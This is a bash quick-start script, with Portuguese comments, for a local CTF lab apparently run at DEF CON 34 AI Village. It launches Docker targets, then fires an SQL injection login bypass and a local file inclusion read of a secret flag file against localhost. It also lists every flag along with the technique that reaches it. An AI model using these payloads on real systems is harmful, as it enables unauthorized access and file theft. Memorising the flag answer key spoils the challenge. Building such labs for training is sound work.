#!/bin/bash
# ============================================
# 🏴 OZZ — Quick Start Script
# Roda o universo sintético + prepara pra Kaggle
# ============================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${GREEN}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║  🏴 OZZ — HALctf Quick Start             ║"
echo "  ║  DEF CON 34 AI Village                   ║"
echo "  ╚══════════════════════════════════════════╝"
echo -e "${NC}"

# === CHECK PREREQUISITES ===
echo -e "${CYAN}[1/5] Checking prerequisites...${NC}"

if ! command -v docker &> /dev/null; then
    echo -e "${RED}❌ Docker not found. Please install Docker first.${NC}"
    exit 1
fi
echo -e "${GREEN}  ✅ Docker found: $(docker --version)${NC}"

if ! command -v docker compose &> /dev/null; then
    if ! command -v docker-compose &> /dev/null; then
        echo -e "${RED}❌ Docker Compose not found.${NC}"
        exit 1
    fi
    COMPOSE_CMD="docker-compose"
else
    COMPOSE_CMD="docker compose"
fi
echo -e "${GREEN}  ✅ Docker Compose found${NC}"

# === BUILD UNIVERSE ===
echo ""
echo -e "${CYAN}[2/5] Building synthetic universe (4 targets + scoreboard)...${NC}"

cd "$(dirname "$0")/universe"
$COMPOSE_CMD build 2>&1 | tail -5

echo -e "${GREEN}  ✅ Universe built${NC}"

# === START UNIVERSE ===
echo ""
echo -e "${CYAN}[3/5] Starting universe...${NC}"

$COMPOSE_CMD up -d 2>&1

echo -e "${GREEN}  ✅ Universe running${NC}"
echo ""
echo -e "${YELLOW}  Targets:${NC}"
echo -e "    🌐 TARGET-01 (Web):     http://localhost:8081"
echo -e "    🔑 TARGET-02 (SSH/SMB): localhost:2222 (SSH), localhost:4455 (SMB)"
echo -e "    ⚡ TARGET-03 (API):     http://localhost:5000"
echo -e "    🗄️  TARGET-04 (MySQL):   Internal only (10.0.0.40)"
echo -e "    📊 SCOREBOARD:          http://localhost:9090"

# === VERIFY TARGETS ===
echo ""
echo -e "${CYAN}[4/5] Verifying targets...${NC}"

sleep 3

# TARGET-01
if curl -s http://localhost:8081 > /dev/null 2>&1; then
    echo -e "${GREEN}  ✅ TARGET-01 (Web) — UP${NC}"
else
    echo -e "${RED}  ❌ TARGET-01 (Web) — DOWN${NC}"
fi

# TARGET-02
if nc -z localhost 2222 2>/dev/null; then
    echo -e "${GREEN}  ✅ TARGET-02 (SSH) — UP${NC}"
else
    echo -e "${YELLOW}  ⚠️  TARGET-02 (SSH) — checking...${NC}"
fi

# TARGET-03
if curl -s http://localhost:5000 > /dev/null 2>&1; then
    echo -e "${GREEN}  ✅ TARGET-03 (API) — UP${NC}"
else
    echo -e "${YELLOW}  ⚠️  TARGET-03 (API) — checking...${NC}"
fi

# SCOREBOARD
if curl -s http://localhost:9090 > /dev/null 2>&1; then
    echo -e "${GREEN}  ✅ SCOREBOARD — UP${NC}"
else
    echo -e "${YELLOW}  ⚠️  SCOREBOARD — checking...${NC}"
fi

# === QUICK ATTACK TEST ===
echo ""
echo -e "${CYAN}[5/5] Quick attack test (SQLi on TARGET-01)...${NC}"

RESPONSE=$(curl -s -X POST 'http://localhost:8081/?page=login' -d "username=admin'--&password=test" 2>/dev/null)
if echo "$RESPONSE" | grep -q "Welcome, admin"; then
    echo -e "${GREEN}  ✅ SQLi works — admin access gained${NC}"

    # Try LFI for flag
    FLAG=$(curl -s 'http://localhost:8081/?page=reports&file=/var/secret/flag.txt' 2>/dev/null)
    if echo "$FLAG" | grep -q "flag{"; then
        echo -e "${GREEN}  ✅ LFI works — flag found: $(echo "$FLAG" | grep -oP 'flag\{[^}]+\}')${NC}"
    fi
else
    echo -e "${YELLOW}  ⚠️  SQLi test inconclusive — check TARGET-01${NC}"
fi

# === DONE ===
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  🏴 UNIVERSE IS LIVE                      ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Next steps:${NC}"
echo -e "  1. Open Kaggle: https://kaggle.com"
echo -e "  2. Create notebook → Enable GPU T4"
echo -e "  3. Upload: scripts/ozz_kaggle.ipynb"
echo -e "  4. Run all cells"
echo ""
echo -e "${CYAN}Scoreboard: http://localhost:9090${NC}"
echo -e "${CYAN}Stop universe: cd universe && $COMPOSE_CMD down${NC}"
echo ""
echo -e "${YELLOW}Flags to find:${NC}"
echo -e "  🚩 flag{web_master}    — TARGET-01 via SQLi + LFI"
echo -e "  🚩 flag{ssh_ghost}     — TARGET-02 via SSH brute-force"
echo -e "  🚩 flag{api_breaker}   — TARGET-03 via JWT bypass"
echo -e "  🚩 flag{deep_vault}    — TARGET-04 via MySQL pivot"
echo -e "  👑 flag{halctf_king}   — TARGET-04 via full chain"
